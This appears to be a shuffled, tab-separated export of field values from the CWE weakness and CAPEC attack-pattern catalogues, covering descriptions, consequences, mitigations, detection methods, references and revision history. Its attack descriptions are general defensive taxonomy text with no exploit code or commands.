14848	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
16644	62	updated Detection_Factors
12506	36	http://samate.nist.gov/SRD/view_testcase.php?tID=1598
8778	35	MITRE
8921	35	MITRE
16697	89	Meta
17265	62	updated Potential_Mitigations
14557	27	A tool capable of sending and receiving packets from a remote system.
6511	88	Product UI does not Warn User of Unsafe Actions
19854	62	updated Causal_Nature, Potential_Mitigations, References
13308	79	Confidentiality
24598	28	CWE Content Team
17766	95	Inject each parameter with content that causes an error condition to manifest
21268	42	If an operation can throw an Exception, implement a handler for that specific exception.
18044	56	CanPrecede
25125	24	MITRE
24066	88	EJB Bad Practices: Use of Java I/O
19644	103	Primary
9686	23	The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.
20363	21	CLASP
16122	28	Eric Dalci
11073	35	MITRE
18966	28	Eric Dalci
22395	28	CWE Content Team
6272	23	This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.
12511	62	updated Relationships
16374	103	Primary
15289	28	CWE Content Team
8233	79	Access Control
8255	35	MITRE
17018	35	MITRE
18175	62	updated Demonstrative_Examples, Observed_Examples
15916	91	Build and Compilation
15491	62	updated Maintenance_Notes, Other_Notes, Relationships
21377	39	2012-05-11
13112	28	CWE Content Team
5803	62	updated Description
12201	62	updated Common_Consequences
23238	28	CWE Content Team
18392	35	MITRE
19704	62	updated Description
19968	23	The software records security-relevant information according to an alternate name of the affected entity, instead of the canonical name.
11678	62	updated Relationships
14829	66	C is for cookie, H is for hacker - understanding HTTP only and Secure cookies
6327	56	ChildOf
18841	85	17
8493	23	Adversary uses malware or a similarly controlled application installed inside an organizational perimeter to gather information about the composition, configuration, and security mechanisms of a targeted application, system or network.
22317	39	2017-11-08
9968	62	updated Relationships
9457	97	PHP Remote File Inclusion
22205	35	MITRE
9886	88	Declaration of Variable with Unnecessarily Wide Scope
22451	77	Dynamic Analysis with Manual Results Interpretation
16484	28	CWE Content Team
24735	43	Simple
7779	59	Updated Related_Weaknesses
10014	42	When designing any function make sure you return a value or throw an exception in case of an error.
14261	39	2011-06-27
6873	31	1000
21055	89	Detailed
24934	39	2017-11-08
21055	97	Influence via Modes of Thinking
13961	62	updated Potential_Mitigations
9865	39	2014-07-30
9120	47	Read Data
10042	67	Low
5699	100	The MITRE Corporation
12146	62	updated Background_Details, Common_Consequences, Other_Notes
16498	62	updated Taxonomy_Mappings
16632	75	Note that this technique is only useful for privilege issues related to system resources. It is not likely to detect application-level business rules that are related to privileges, such as if a blog system allows a user to delete a blog entry without first checking that the user has administrator privileges.
20887	90	C
18711	35	MITRE
18535	39	2017-01-19
24383	35	MITRE
11147	79	Confidentiality
7214	28	CWE Content Team
16563	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.
23117	76	2018-07-31
10766	59	Updated References
6145	91	Implementation
22409	56	ChildOf
17044	63	Bypass Protection Mechanism
7673	62	updated Description
8717	39	2012-05-11
17734	63	Bypass Protection Mechanism
15806	62	updated Description, Other_Notes, Potential_Mitigations
6882	28	CWE Content Team
19123	50	Design: Use browser technologies that do not allow client side scripting.
6309	35	MITRE
11197	28	CWE Content Team
12863	35	MITRE
14736	63	Modify Application Data
24695	27	Scanners or utilities that provide the ability to send custom ICMP queries.
14855	91	Architecture and Design
10156	31	699
23328	62	updated Relationships, Taxonomy_Mappings
19519	80	It is fairly simple for someone with basic SQL knowledge to perform SQL injection, in general. In certain instances, however, specific knowledge of the database employed may be required.
15066	51	2018-07-31
12624	28	CWE Content Team
10820	63	Alter Execution Logic
13904	103	Primary
13208	39	2011-09-13
7079	103	Primary
15605	43	Simple
11897	89	Standard
10467	31	1000
20343	28	CWE Content Team
11463	35	MITRE
19663	63	Modify Application Data
16411	39	2014-07-30
19733	28	CWE Content Team
7152	59	Updated Related_Attack_Patterns
25127	26	Operation
6554	28	CWE Content Team
10053	28	CWE Content Team
23961	55	CAPEC Content Team
9322	103	Primary
20414	62	updated Relationships, Other_Notes, Taxonomy_Mappings
14966	31	699
9988	62	updated Description, Name
17565	46	If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.             State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an "authenticated=true" cookie. An attacker may simply create this cookie in order to bypass the authentication.
23734	28	CWE Content Team
25383	80	To bypass filters in the application
15396	35	MITRE
5760	62	updated Relationships, Other_Notes, Taxonomy_Mappings
19543	42	Obfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service.
20643	81	Integrity
24717	103	Primary
22187	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
9705	31	1000
10831	28	CWE Content Team
6182	35	MITRE
19925	51	2014-06-23
14118	79	Confidentiality
6276	39	2009-10-29
20861	77	Automated Static Analysis - Source Code
13732	91	Architecture and Design
12647	77	Automated Static Analysis - Binary or Bytecode
24244	39	2012-10-30
6290	89	Standard
17149	62	updated Relationships
8617	48	09
8941	51	2014-06-23
18397	85	109
14608	44	High
15599	76	2015-11-09
24369	28	CWE Content Team
17535	79	Integrity
19305	62	updated Time_of_Introduction
11837	103	Primary
16651	97	XQuery Injection
23163	90	Language-Independent
18188	79	Access Control
11609	28	CWE Content Team
9669	32	The Wikimedia Foundation, Inc
10707	62	updated Demonstrative_Examples, Description, Relationships, Taxonomy_Mappings
21402	39	2012-05-11
14233	56	ChildOf
17835	62	updated Related_Attack_Patterns
11706	89	Standard
19179	30	David Wheeler
11258	92	Experiment
21278	79	Authorization
14505	25	Low
24190	39	2017-11-08
7714	35	MITRE
9297	104	467
8419	62	updated Time_of_Introduction
20368	28	CWE Content Team
8234	73	Use an automated tool automatically probe the inputs for XPath weaknesses.
25162	62	updated Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
17879	43	Simple
8069	56	ChildOf
8325	59	Updated Attack_Phases, Description Summary, Related_Attack_Patterns
18087	62	updated Relationships
7214	62	updated Relationships, Taxonomy_Mappings
18866	81	Confidentiality
9122	42	Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.                   When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.                   Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).
23239	40	An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.
8491	35	MITRE
20662	56	ChildOf
6936	85	102
11901	86	http://erratasec.blogspot.com/2009/02/importance-of-being-canonical.html
14390	62	updated Common_Consequences, References, Relationships, Taxonomy_Mappings
11379	72	Integer coercion often leads to undefined states of execution resulting in infinite loops or crashes.
23641	28	CWE Content Team
10799	39	2014-07-30
6546	47	Execute Unauthorized Commands
19548	56	CanAlsoBe
20189	104	1096
15170	59	Updated Related_Attack_Patterns
24410	39	2014-07-30
11183	97	Unauthorized Use of Device Resources
22458	35	MITRE
11145	67	Medium
23248	61	Draft
21166	39	2008-07-01
23072	80	To force symlink and timing issues for redirecting access to libraries
7994	62	updated Relationships
18876	28	CWE Content Team
25041	35	MITRE
22883	23	The software does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory.
24998	56	CanPrecede
19880	81	Other
16795	88	Dangling Database Cursor ('Cursor Injection')
17096	23	In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.
22057	50	Implementation: Use possible permissions on file access when developing and deploying web applications.
16957	39	2009-12-28
13883	85	538
17602	49	2006
10611	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
21701	28	Sean Eidemiller
18448	77	Manual Static Analysis - Binary or Bytecode
12748	92	Experiment
24221	62	updated Name
22965	55	CAPEC Content Team
12113	35	MITRE
23028	39	2009-10-29
19621	104	263
9200	78	High
13361	28	CWE Content Team
5988	62	updated Time_of_Introduction
18658	39	2009-05-27
13612	73	Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive.
7086	39	2012-10-30
9967	62	updated Relationships
22584	63	Alter Execution Logic
6702	28	CWE Content Team
11369	31	1000
9426	62	updated Name, Relationships
13194	62	updated Relationships
20125	28	CWE Content Team
14738	35	MITRE
22108	62	updated Common_Consequences
5935	100	The MITRE Corporation
5791	39	2008-07-01
8699	28	CWE Content Team
19716	27	This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
12291	62	updated Relationships
17272	56	ChildOf
19112	28	CWE Content Team
18123	35	MITRE
12085	31	1000
8049	35	MITRE
22216	28	CWE Content Team
11795	33	Thomas Prescher
6780	28	CWE Content Team
12912	39	2008-09-08
24935	69	Incomplete
12039	35	MITRE
18099	62	updated Common_Consequences
6185	62	updated Common_Consequences
22250	39	2012-05-11
5715	51	2014-06-23
6520	102	ChildOf
8162	28	CWE Content Team
9326	39	2009-03-10
15494	62	updated Common_Consequences
22908	35	MITRE
12867	79	Access Control
20448	44	SOAR Partial
14700	91	Implementation
17378	85	427
16575	28	CWE Content Team
9959	78	Low
18532	69	Incomplete
7295	45	Variant
21343	62	updated Relationships
14696	91	Implementation
22885	56	ChildOf
17627	39	2014-07-30
7604	21	PLOVER
14912	35	MITRE
19027	28	CWE Content Team
21133	23	An exact value or random number can be precisely predicted by observing previous values.
9248	62	updated Relationships
21941	39	2011-03-29
7097	79	Confidentiality
20066	97	Exploiting Incorrectly Configured Access Control Security Levels
20929	62	updated Demonstrative_Examples, References, Relationships
23237	39	2012-05-11
23528	90	Language-Independent
19325	28	CWE Content Team
13008	39	2011-09-13
11145	46	It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.             Data that is untrusted can not be trusted to be well-formed.             When developers place no restrictions on "gadget chains," or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.
6821	63	Varies by Context
22319	35	MITRE
8637	43	Simple
15851	28	CWE Content Team
19723	43	Simple
17656	28	CWE Content Team
17293	61	Draft
23004	73	Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.
6155	28	CWE Content Team
8251	101	CAPEC Content Team
10110	103	Primary
8147	56	ChildOf
15087	76	2019-04-04
15448	42	Turn all pages to non-cacheable.
10424	56	PeerOf
8033	35	MITRE
15774	89	Detailed
22541	104	142
19917	79	Availability
16821	104	279
14274	28	CWE Content Team
19611	31	1000
7355	101	CAPEC Content Team
8794	28	CWE Content Team
7821	31	1000
14502	79	Availability
7714	62	updated Common_Consequences, Other_Notes
5874	25	High
21725	33	Erika Chin
8745	55	CAPEC Content Team
8864	31	699
5961	102	ChildOf
23379	81	Other
14982	39	2009-05-27
8262	35	MITRE
24391	39	2008-09-08
8548	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
21213	88	Key Exchange without Entity Authentication
24575	39	2012-10-30
16930	39	2019-06-20
13063	104	184
6686	35	MITRE
20096	50	Properly validate and sanitize/reject user input at the service provider.
16003	66	SQL Injection Attack
23213	62	updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Research_Gaps, Terminology_Notes
22217	101	CAPEC Content Team
9243	35	MITRE
6870	28	CWE Content Team
15029	39	2012-05-11
9686	104	584
9545	35	MITRE
14023	35	MITRE
6635	27	The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.
12013	80	An attacker can inject different representation of a filtered character in UTF-8 format.
16517	35	MITRE
12673	63	Gain Privileges or Assume Identity
13568	44	High
21448	39	2017-11-08
24908	104	395
11673	62	updated Time_of_Introduction
8505	35	MITRE
9394	47	Bypass Protection Mechanism
15708	101	CAPEC Content Team
16540	70	The Software Supply Chain Integrity Framework Defining Risks and Responsibilities for Securing Software in the Global Supply Chain
11808	39	2011-06-01
7125	28	CWE Content Team
6973	69	Incomplete
16336	30	Awais Rashid
20272	31	699
10522	28	CWE Content Team
18828	39	2013-07-17
16247	33	Apple
21951	62	updated Potential_Mitigations, Time_of_Introduction
9187	35	Cigital
9032	62	updated Common_Consequences
18064	35	MITRE
12630	81	Integrity
17231	100	The MITRE Corporation
11044	43	Simple
13934	56	CanPrecede
7081	28	CWE Content Team
6035	21	PLOVER
20378	103	Primary
11128	39	2008-09-08
24235	62	updated References, Relationships
7462	62	updated Common_Consequences, Observed_Examples, Potential_Mitigations, References, Relationships
13937	30	Minaxi Gupta
15690	71	2010
23339	28	CWE Content Team
22766	26	Implementation
13098	31	1000
20588	23	The software contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.
7474	39	2014-06-23
13616	102	ChildOf
21876	35	MITRE
11550	81	Integrity
7243	35	MITRE
7400	35	Cigital
23819	35	MITRE
11685	79	Authorization
22274	36	https://queue.acm.org/detail.cfm?id=2668966
21096	35	MITRE
12203	51	2014-06-23
25238	51	2015-11-09
12688	39	2009-03-10
7313	62	updated Relationships, Other_Notes
11220	77	Automated Static Analysis - Binary or Bytecode
13921	62	updated Common_Consequences
20353	62	updated Relationships, Taxonomy_Mappings
22051	26	Implementation
13124	35	MITRE
22072	48	08
23943	96	2018-07-02
7738	74	1
15181	26	Architecture and Design
11026	62	updated Description, Name
21827	26	Implementation
16433	62	updated Applicable_Platforms
25000	56	ChildOf
18641	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
16969	56	ChildOf
21092	27	The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.
23590	62	updated Detection_Factors
19277	56	ChildOf
9302	39	2009-07-27
18520	77	Automated Static Analysis
11562	28	CWE Content Team
17422	96	2018-07-02
6043	44	SOAR Partial
17232	91	Operation
11367	39	2019-06-20
20380	28	CWE Content Team
15298	78	Low
11336	72	Packets from a variety of network services may be stolen or the services spoofed.
24959	104	595
11354	62	updated Potential_Mitigations
8907	39	2017-01-19
10709	63	Other
11861	88	Improper Neutralization of Expression/Command Delimiters
19570	35	Cigital
19691	101	CAPEC Content Team
13770	88	Privilege Dropping / Lowering Errors
12130	35	MITRE
8618	42	If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.                   Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.
10501	39	2009-12-28
21940	56	ChildOf
22290	28	CWE Content Team
8348	53	The MITRE Corporation
23275	28	CWE Content Team
6862	35	Cigital
19979	28	CWE Content Team
13700	28	CWE Content Team
9745	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
6757	39	2008-09-08
23927	56	ChildOf
6209	39	2008-07-01
24314	59	Updated References
5664	35	MITRE
24697	53	The MITRE Corporation
5857	31	700
12115	39	2012-05-11
15954	100	The MITRE Corporation
21486	51	2014-06-23
5842	85	181
17028	62	updated Description
8271	36	https://media.blackhat.com/ad-12/Niemietz/bh-ad-12-androidmarcus_niemietz-WP.pdf
17612	39	2011-06-01
10016	35	MITRE
22853	35	MITRE
21501	104	447
24765	28	CWE Content Team
22447	69	Draft
21590	46	Several flaws fall under the category of integer coercion errors. For the most part, these errors in and of themselves result only in availability and data integrity issues. However, in some circumstances, they may result in other, more complicated security related flaws, such as buffer overflow conditions.
13564	39	2011-06-27
12532	23	The software receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component.
14803	26	Architecture and Design
20199	39	2019-06-20
11245	63	Quality Degradation
18402	39	2019-01-03
25230	104	638
20189	88	Singleton Class Instance Creation without Proper Locking or Synchronization
13166	39	2019-01-03
13682	35	MITRE
12803	103	Primary
16771	104	535
22764	35	MITRE
18440	26	Implementation
19090	21	PLOVER
6081	24	MITRE
19497	28	CWE Content Team
20878	35	MITRE
13250	100	The MITRE Corporation
21820	39	2012-10-30
7794	62	updated Related_Attack_Patterns
10631	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Manual Source Code Review (not inspections)
14862	62	updated References
17654	35	MITRE
6174	40	Targeted software is utilizing application framework APIs
18708	91	Implementation
23140	101	CAPEC Content Team
15870	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host Application Interface Scanner                            Fuzz Tester                            Framework-based Fuzzer
15513	47	Resource Consumption
12232	39	2019-09-19
15735	35	MITRE
22052	28	CWE Content Team
19892	39	2011-06-01
15451	81	Availability
13209	100	The MITRE Corporation
15584	91	Architecture and Design
8545	31	699
13913	51	2014-06-23
11660	104	708
13992	27	A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).
7931	39	2017-01-19
17719	39	2009-03-10
20217	62	updated Relationships
12128	56	ChildOf
22629	56	ChildOf
14872	97	Influence via Incentives
10822	81	Other
11687	28	CWE Content Team
6922	35	MITRE
13079	35	MITRE
22057	40	The target must fail to adequately sanitize incoming paths
7138	63	Gain Privileges or Assume Identity
6900	91	Architecture and Design
7766	62	updated References, Relationships
20013	43	Simple
25278	90	Language-Independent
14019	35	Veracode
5735	28	CWE Content Team
22772	104	564
7295	104	622
24964	62	updated Common_Consequences
7090	66	Use reentrant functions for safer signal handling
16543	23	The code contains a switch statement in which the switched variable can be modified while the switch is still executing, resulting in unexpected behavior.
13272	35	MITRE
8249	40	The adversary requires logical access to the target network. NULL scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.
15844	23	An application uses a "whitelist" of acceptable values, but the whitelist includes at least one unsafe value, leading to resultant weaknesses.
20212	35	Cigital
5739	39	2014-07-30
24628	28	CWE Content Team
10015	28	CWE Content Team
13734	28	CWE Content Team
16876	39	2015-12-07
13324	62	updated Time_of_Introduction
23161	62	updated Applicable_Platforms
21614	28	CWE Content Team
20137	94	Attackers can disrupt or deny mobile technology communications and operations.
9258	31	699
20113	28	CWE Content Team
10875	81	Other
22765	80	Open source and commercial software tools are available and open databases of known WiFi SSID addresses are available online.
13164	89	Detailed
10033	35	MITRE
9011	62	added/updated demonstrative examples
11624	88	Files or Directories Accessible to External Parties
20580	39	2018-03-27
11709	28	CWE Content Team
8379	33	Object Management Group (OMG)
11429	39	2014-07-30
17117	23	An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.
19364	79	Accountability
19177	23	In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.
6702	39	2017-05-03
17388	43	Simple
22104	77	Architecture or Design Review
20758	39	2008-07-01
11195	39	2012-05-11
22746	39	2011-06-01
13410	31	1000
12555	76	2017-08-04
23455	43	Simple
14609	62	updated Description, Name
14614	72	This weakness could place the system in a state that could lead unexpected logic to be executed or other unintended behaviors.
15583	76	2019-04-04
22381	81	Integrity
12577	76	2019-09-30
18496	100	The MITRE Corporation
6401	102	ChildOf
12477	62	updated Common_Consequences
21069	103	Primary
18896	35	MITRE
9909	43	Simple
12886	59	Updated Examples-Instances, Related_Vulnerabilities
22747	61	Draft
6697	90	C#
17516	76	2017-08-04
18550	62	updated Description, Other_Notes
9176	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
12880	103	Primary
18832	39	2008-09-08
12886	76	2017-08-04
15688	26	Implementation
10268	28	CWE Content Team
15724	86	http://msdn.microsoft.com/en-us/library/ms794722.aspx
10853	56	ChildOf
11396	72	If a PRNG is used for authentication and authorization, such as a session ID or a seed for generating a cryptographic key, then an attacker may be able to easily guess the ID or cryptographic key and gain access to restricted functionality.
18567	39	2013-07-17
10347	81	Confidentiality
10276	91	Architecture and Design
16430	100	The MITRE Corporation
23531	62	updated Potential_Mitigations, Time_of_Introduction
11059	26	Implementation
19847	39	2008-10-14
14013	31	700
21132	23	An adversary contaminates organizational information systems (including devices and networks) by causing them to handle information of a classification/sensitivity for which they have not been authorized. The information is exposed to individuals who are not authorized access to such information, and the information system, device, or network is unavailable while the spill is investigated and mitigated.
21248	62	updated Description
23702	28	Eric Dalci
17018	39	2014-07-30
22223	35	MITRE
16956	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16798	76	2019-04-04
10223	53	The MITRE Corporation
13545	56	ChildOf
6942	62	updated Common_Consequences
18559	43	Composite
8602	35	MITRE
24368	69	Incomplete
13006	63	Read Application Data
9448	81	Confidentiality
23073	28	CWE Content Team
13992	40	An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.
9671	88	Irrelevant Code
14744	35	MITRE
7478	24	MITRE
6317	62	updated Potential_Mitigations
7054	35	MITRE
12122	101	CAPEC Content Team
13123	32	Software As She's Developed
13595	28	CWE Content Team
22951	100	The MITRE Corporation
14017	28	CWE Content Team
10486	28	CWE Content Team
19222	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings
13179	28	CWE Content Team
22670	31	699
12537	28	CWE Content Team
11029	42	Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.
6006	62	added/updated demonstrative examples
18810	39	2010-06-21
23211	35	MITRE
5695	39	2010-02-16
11164	31	1000
10105	100	The MITRE Corporation
6189	88	Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')
24994	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required
23815	62	updated Common_Consequences, Other_Notes
21778	104	836
14196	62	updated Related_Attack_Patterns
12492	103	Primary
23056	35	MITRE
23618	78	Medium
9909	45	Variant
10971	72	An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users.
17721	62	updated Common_Consequences
18412	39	2010-12-13
13800	53	The MITRE Corporation
17752	23	The software does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.
19404	28	CWE Content Team
17642	35	MITRE
14360	39	2019-01-03
12475	35	MITRE
24809	73	Use automated tools to scan the service to attempt to reverse engineer exposed, but undocumented, features.
20530	35	MITRE
21405	62	updated Description
8954	39	2013-07-17
13291	28	CWE Content Team
10752	39	2011-06-27
6999	28	CWE Content Team
24256	97	Subverting Environment Variable Values
17520	74	3
11576	44	High
14572	41	2019-09-23
14945	39	2008-07-01
21699	55	CAPEC Content Team
9214	39	2010-06-21
11298	104	329
20939	97	Client-Server Protocol Manipulation
24637	48	11
5917	28	CWE Content Team
16973	50	Typically, an IDS/IPS system is very effective against this type of attack.
12088	62	updated Relationships
11496	62	updated Potential_Mitigations
15621	94	A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.
19925	55	CAPEC Content Team
17076	79	Access Control
21371	35	MITRE
16533	94	Run Arbitrary Code
13575	35	MITRE
9700	28	CWE Content Team
23818	97	Traceroute Route Enumeration
7475	27	Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.
5909	62	updated Relationships
9580	63	Modify Memory
20903	44	High
21204	104	309
7520	86	http://seclists.org/vuln-dev/2004/Jan/0022.html
9013	62	updated Demonstrative_Examples
20739	46	In some languages, braces (or other delimiters) are optional for blocks. When the delimiter is omitted, it is possible to insert a logic error in which a statement is thought to be in a block but is not. In some cases, the logic error can have security implications.
7811	40	The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.
12580	97	Exploiting Multiple Input Interpretation Layers
12144	28	CWE Content Team
17457	46	Locking is a type of synchronization behavior that ensures that multiple independently-operating processes or threads do not interfere with each other when accessing the same resource. All processes/threads are expected to follow the same steps for locking. If these steps are not followed precisely - or if no locking is done at all - then another process/thread could modify the shared resource in a way that is not visible or predictable to the original process.  This can lead to data or memory corruption, denial of service, etc.
17089	62	updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
9310	28	CWE Content Team
20115	91	Implementation
16156	28	CWE Content Team
23830	28	CWE Content Team
16620	35	MITRE
14317	79	Confidentiality
13633	35	MITRE
7397	39	2017-05-03
6891	35	MITRE
17097	56	ChildOf
5726	28	CWE Content Team
10160	81	Integrity
16439	92	Experiment
19369	47	Read Data
9148	39	2013-07-17
8642	31	1000
19605	74	1
12891	35	Cigital
9307	51	2014-06-23
13842	88	Least Privilege Violation
16746	81	Access Control
17167	28	CWE Content Team
24882	54	Medium
10385	56	ChildOf
19001	28	Eric Dalci
18969	47	Resource Consumption
11721	45	Variant
19112	62	updated Relationships
20714	35	MITRE
19104	56	ChildOf
24953	59	Updated Related_Weaknesses
21026	53	The MITRE Corporation
13998	57	Resultant
5936	40	This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.
20458	101	CAPEC Content Team
21473	36	http://samy.pl/evercookie/
13376	79	Confidentiality
12584	39	2017-11-08
17252	62	updated Relationships
15797	79	Authorization
25139	28	CWE Content Team
21150	62	updated Potential_Mitigations
11040	79	Access Control
18870	79	Confidentiality
20857	49	2012
18669	23	The software does not release a file descriptor or handle after its effective lifetime has ended, i.e., after the file descriptor/handle is no longer needed.
15218	46	This can introduce resultant weaknesses or make it easier for developers to introduce related weaknesses during implementation. Because code is centered around design, it can be resource-intensive to fix design problems.
23831	28	CWE Content Team
14598	39	2019-06-20
11810	102	ChildOf
16697	78	High
21809	91	Policy
20157	39	2014-07-30
16931	28	CWE Content Team
21916	23	The software uses a resource that contains sensitive data, but it does not properly remove that data before it stores, transfers, or shares the resource with actors in another control sphere.
14551	72	The power source could be drained, causing the application - and the entire device - to cease functioning.
17187	39	2014-07-30
15428	48	01
17825	25	Low
11018	23	The program contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.
15453	81	Access Control
13987	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
13157	28	CWE Content Team
25101	31	699
18187	100	The MITRE Corporation
9841	61	Draft
9956	56	ChildOf
7929	35	MITRE
10003	74	4
7140	62	updated Potential_Mitigations
24234	40	The program does not properly handle postfix NULL terminators
9074	39	2012-05-11
13370	102	ChildOf
20817	45	Variant
20369	31	699
23483	44	SOAR Partial
20060	59	Updated Attack_Phases
8053	31	699
20691	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Binary / Bytecode Quality Analysis                                                                     Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis
10476	30	Marco Balduzzi
20267	28	CWE Content Team
13044	35	MITRE
10869	28	CWE Content Team
17366	79	Access Control
23054	62	updated Applicable_Platforms, Description, Other_Notes
6436	102	ChildOf
14445	97	Signature Spoof
20282	79	Non-Repudiation
11886	89	Meta
22476	79	Integrity
